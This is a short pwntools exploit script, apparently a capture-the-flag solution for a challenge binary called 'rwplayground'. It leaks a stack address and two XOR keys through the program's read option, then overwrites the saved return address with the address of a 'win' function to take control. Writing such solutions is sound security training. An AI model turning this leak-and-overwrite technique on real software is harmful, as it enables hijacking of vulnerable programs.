from pwn import *

context.binary = elf = ELF('./rwplayground')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('rwplayground.challs.olicyber.it', 38051)
else:
    r = gdb.debug(elf.path, '''
        b main
        continue
    ''')

r.recvuntil(b'0x')
v4_addr = int(r.recvline().strip().decode(), 16)

log.success(f'v4_addr: {hex(v4_addr)}')

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', hex(0x404068).encode())
r.recvuntil(b'0x')
read_key = int(r.recvline().strip().decode(), 16)
log.success(f'read_key: {hex(read_key)}')

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'0x00000000004040B8')
r.recvuntil(b'0x')
write_key = int(r.recvline().strip().decode(), 16) ^ read_key 
log.success(f'write_key: {hex(write_key)}')

r.sendlineafter(b'> ', b'2')
r.sendlineafter(b': ', hex((v4_addr + 0x14)).encode())

log.info(f'ret_addr: {hex(v4_addr + 0x14)}')
log.info(f'win: {hex(elf.sym["win"])}')

r.sendlineafter(b': ', hex(elf.sym['win'] ^ write_key).encode())
r.sendlineafter(b'> ', b'4')
    
r.interactive()
